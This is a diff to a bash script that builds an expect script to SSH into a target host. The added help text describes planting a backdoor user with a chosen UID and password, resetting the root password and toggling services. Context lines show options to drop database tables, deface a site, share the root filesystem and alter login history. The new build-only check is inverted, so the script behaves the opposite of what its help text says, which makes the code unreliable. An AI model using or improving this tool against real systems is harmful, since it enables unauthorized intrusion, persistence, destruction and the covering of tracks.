@@ -6,10 +6,44 @@
 # mount remote share
 
 if [ "$1" = "-h" -o "$1" = "--help" ]; then
-	echo "Usage: $0 [user@host]|[user@host:port] [password] [options]"
-	echo "Example: $0 root@1.2.3.4 toor"
-	echo "Example: $0 root@1.2.3.4:2222 toor"
+	echo -e "\nUsage: $0 [user@host]|[user@host:port] [password] [options]"
+	echo -e "\n	Example: $0 root@1.2.3.4 toor"
+	echo -e "	Example: $0 root@1.2.3.4:2222 toor\n"
+	echo -e "Invoking the script without any parameters will enter the script in manual configuration mode\n"
+	echo "	-h, --help"
+	echo -e "			Print this help information.\n"
+	echo "	-B, --build-only"
+	echo "			Specifying this option will only build the"
+	echo "			script and not execute after building it. This can be"
+	echo -e "			useful when preparing an expect script for later use.\n"
+	echo "	-p, --port X"
+	echo "			Allows user to specify which port SSH is running on"
+	echo -e "			the target.\n"
+	echo "	-P, --password <your_password_here>"
+	echo "			Allows you to specify which password the backdoor"
+	echo -e "			user will have on the remote target.\n"
+	echo "	-r, --root-password"
+	echo "			Allows you to specify the new root password on the"
+	echo -e "			target.\n"
+	echo "	-s,overwrite|append service1,service2"
+	echo "			Allows you to specify which services are started on"
+	echo "			the target. The overwrite option means you overwrite"
+	echo "			the default services the script has configured. The"
+	echo "			append option allows you to add to the services"
+	echo -e "			already configured.\n"
+	echo "	-S,overwrite|append service1,service2"
+	echo "			Same as the -s option but this is for the services"
+	echo -e "			to be stopped on the target.\n"
+	echo "	-u, --userid X"
+	echo "			This option allows you to specify what you want the"
+	echo -e "			UID of backdoor user to be when added on the target.\n"
 	exit 0
+fi
+
+location=`which expect`
+if [ "$location" == "" ]; then
+	echo "You do not have expect installed so this script will not run properly."
+	echo -e "The expect script will be built but cannot be run successfully\nuntil you install expect."
 fi
 
 #variables - can be changed to meet different needs
@@ -26,6 +60,7 @@ dropTables="no"
 defaceSite="no"
 shareRoot="no"
 alterLastHistory="no"
+buildOnly="no"
 
 if [ $# -gt 0 ]; then
 	firstArg=`echo $1 | /usr/bin/env awk -F":" '{print $1}'`
@@ -36,6 +71,7 @@ if [ $# -gt 0 ]; then
 		pass=$2
 	fi
 	user=`echo $firstArg | /usr/bin/env awk -F"@" '{print $1}'`
+	shift 2
 else
 	echo "Values can also be given as command line arguments."
 	read -p "Enter host: " host
@@ -148,6 +184,8 @@ interact
 BOTTOM
 
 echo "Attempting login..."
-/usr/bin/expect myfile.exp
+if [ "$buildOnly" != "no" ]; then
+	/usr/bin/expect myfile.exp
+fi
 echo "Completed."
 
